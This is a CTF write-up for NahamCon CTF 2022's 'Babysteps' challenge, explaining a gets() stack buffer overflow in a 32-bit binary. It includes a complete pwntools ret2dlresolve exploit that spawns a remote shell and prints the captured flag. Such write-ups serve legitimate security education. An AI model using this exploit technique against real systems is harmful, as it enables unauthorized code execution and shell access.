# NahamCon CTF 2022

## Babysteps 

> Become a baby! Take your first steps and jump around with BABY SIMULATOR 9000! 
>
> Author: @JohnHammond#6971
>
> [`babysteps`](babysteps) [`babysteps.c`](babysteps.c)

Tags: _pwn_ _x86_ _bof_ _remote-shell_ _ret2dlresolve_


## Summary

Embryo pwn featuring `gets`.

From `man gets`:

```
BUGS

Never use gets(). Because it is impossible to tell without knowing the data
in advance how many characters gets() will read, and because gets() will
continue to store characters past the end of the buffer, it is extremely
dangerous to use. It has been used to break computer security. Use fgets()
instead.
```

## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

No mitigations, basically choose your own adventure.  I went with _ret2dlresolve_ because I'm lazy and the code is identical for most `gets` challenges.


### Ghidra Decompile

```c
void ask_baby_name(void)
{
  char local_1c [20];
  
  puts("First, what is your baby name?");
  gets(local_1c);
  return;
}
```

`gets` is the vulnerability and given no constraints there are numerous ways to solve this.

`local_1c` is `0x1c` bytes from the base of the stack frame (right above the return address `main` will _return_ to on `return`).  To exploit just write out `0x1c` bytes of garbage followed by your exploit.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./babysteps', checksec=False)

rop = ROP(binary)
dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])

rop.gets(dl.data_addr)
rop.ret2dlresolve(dl)

if args.REMOTE:
    p = remote('challenge.nahamcon.com', 31127)
else:
    p = process(binary.path)

payload  = b''
payload += 0x1c * b'A'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendlineafter(b'name?\n',payload)
p.interactive()
```

Google _ret2dlresolve_ or read some of my other write ups for details.

Output:

```bash
# ./exploit.py REMOTE=1
[*] Loaded 10 cached gadgets for './babysteps'
[+] Opening connection to challenge.nahamcon.com on port 31127: Done
[*] Switching to interactive mode
$ cat flag.txt
flag{7d4ce4594f7511f8d7d6d0b1edd1a162}
```